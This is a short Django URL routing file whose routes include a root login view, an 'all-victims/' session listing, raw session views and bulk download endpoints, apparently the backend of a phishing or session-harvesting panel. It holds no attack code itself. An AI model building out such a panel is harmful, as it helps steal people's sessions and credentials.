from django.contrib import admin
from django.urls import path
from core import views

urlpatterns = [
    path('admin/', admin.site.urls),
    path('', views.login_view),
    path('all-victims/', views.get_all_sessions),
    path('download/', views.download_all),
    path('sessions/', views.raw_sessions),
    path('dashboard/', views.dashboard, name='dashboard'),
    path('download-json/', views.download_json),
]